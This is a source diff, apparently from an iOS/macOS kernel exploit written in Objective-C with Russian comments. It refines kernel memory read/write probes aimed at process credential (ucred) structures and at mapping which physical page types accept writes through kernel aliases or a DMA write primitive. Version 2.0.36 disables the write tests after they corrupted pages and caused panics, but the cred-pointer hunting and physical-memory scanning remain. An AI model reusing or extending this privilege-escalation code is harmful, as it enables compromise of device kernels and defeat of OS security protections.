@@ -8006,6 +8006,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         kpNote(r, [NSString stringWithFormat:@"  [UCRW-PROBE] ucred_rw+0x10 → %#llx pagePA=%#llx тип=%d:%@",
                                   (unsigned long long)rw10, (unsigned long long)r10pa, r10t, d10]);
                     }
+                    if (0) {  // 2.0.36: запись-тест вырезан (async +1 корруптил чужие страницы)
                     // 2.0.23: тест записи типа 0x21 — refcount 0x42 → 0x43 → restore.
                     // Маркер безопасен (возвращаем сразу), результат = пишется ли тип.
                     if (ucRWpa && rwT == 0x21) {
@@ -8020,6 +8021,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                                       (unsigned long long)ref0, (unsigned long long)ref1, (unsigned long long)ref2,
                                       ref1 == ref0 + 1 ? @"ПИШЕТСЯ ★★" : @"не пишется"]);
                         }
+                    }
                     }
                 }
                 uint64_t ucLb = kp_untag_ptr(early_kread64(ucF + 0x78));
@@ -8145,33 +8147,21 @@ if (0) {  // 2.0.35: записи в cred-пространство выреза�
                 {
                     kpNote(r, @"  [WRIMAP] старт: карта пишущегося ядра");
                     uint64_t wB = kconstant(physBase), wN = kconstant(physSize) >> 14;
-                    // --- A: тип-матрица (ТОЛЬКО DMA-пробы: kwrite по алиасу
-                    // 0xb/0x18 = aperture fault → паника 12:06:50; kwrite-безопасен
-                    // только 0x21 — это уже доказано). DMA молча дропает RO-кадры.
-                    kpNote(r, @"  [WRIMAP] kwrite-апертура: RW только у типа 0x21 (паники 10:17/12:06 — факты). Матрица — DMA-пробами.");
+                    // --- A: тип-матрица READ-ONLY (2.0.36: DMA-пробы вырезаны —
+                    // асинхронный +1 попадал в чужие страницы ПОСЛЕ readback,
+                    // restore пропускался → накопленная порча → zfree-паники).
                     int wTypes[7] = { 0x0b, 0x0e, 0x21, 0x13, 0x11, 0x17, 0x37 };
                     for (int wi = 0; wi < 7; wi++) {
                         int t = wTypes[wi];
                         uint64_t tp = 0;
-                        for (uint64_t i = (0x40000000ULL >> 14); i < wN; i++) {
-                            uint64_t pa = wB + (i << 14);
-                            if (kpFrameTypeOf(pa) == t) { tp = pa; break; }
+                        for (uint64_t i2 = (0x40000000ULL >> 14); i2 < wN; i2++) {
+                            uint64_t pa2 = wB + (i2 << 14);
+                            if (kpFrameTypeOf(pa2) == t) { tp = pa2; break; }
                         }
-                        if (!tp) { kpNote(r, [NSString stringWithFormat:@"  [WRIMAP] тип 0x%x: кадров ≥256MB не найдено", t]); continue; }
-                        uint64_t al = phystokv(tp);
-                        if (!al) continue;
-                        uint64_t v0 = early_kread64(al + 0x100);
-                        // DMA-проба: пишем v0+1 через фабрику, смотрим readback, возвращаем v0
-                        // (restore тоже DMA — early_kwrite по алиасу 0xb/0x18 = паника!)
-                        BOOL d1 = svc && tsdV && ttM && isTable ?
-                            kpPhysWrite8v2(svc, tsdV, ttM, isTable, tp, 0x100, v0 + 1, r) : NO;
-                        uint64_t v1 = early_kread64(al + 0x100);
-                        if (d1 && v1 != v0 && svc && tsdV && ttM && isTable)
-                            kpPhysWrite8v2(svc, tsdV, ttM, isTable, tp, 0x100, v0, r);
-                        kpNote(r, [NSString stringWithFormat:@"  [WRIMAP] тип 0x%x: pa=%#llx %#llx→%#llx DMA=%d — %@",
-                                  t, (unsigned long long)tp, (unsigned long long)v0, (unsigned long long)v1, d1,
-                                  v1 == v0 + 1 ? @"DMA-ПИШЕТСЯ ★" : @"DMA-RO/дроп"]);
+                        kpNote(r, [NSString stringWithFormat:@"  [WRIMAP] тип 0x%x: первый кадр pa=%#llx (запись-пробы отключены)",
+                                  t, (unsigned long long)tp]);
                     }
+
                     // --- B: selfTask — ищем указатели на наш cred/label ---
                     // 2.0.30: task_self() через сломанную цепь вернул 0 — берём
                     // через proc_task(selfProcM), он у нас есть.
